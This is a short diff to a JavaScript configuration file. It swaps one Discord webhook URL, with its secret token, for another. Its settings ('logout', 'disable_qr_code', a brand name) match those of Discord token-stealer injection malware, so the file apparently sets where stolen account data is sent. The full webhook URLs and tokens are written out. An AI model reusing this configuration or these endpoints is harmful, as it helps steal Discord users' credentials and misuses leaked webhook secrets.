@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "JAMEKA",
 
-    webhook: "https://discord.com/api/webhooks/993873907201351740/Ayv86ApXweho03J4iUdhGnfYAdRTS43BU33oi8RN1I6wAr5Fyghb10jVbbyxCdjVf1mi",
+    webhook: "https://discord.com/api/webhooks/992397582691225610/NzE4CzCsSszdb7tYO2BHJe8jSD8PcCTraUYlAmAYx9VdN6g4inMfAxY-qLYCJVCLs3lj",
 
     logout: true,
     disable_qr_code: true,
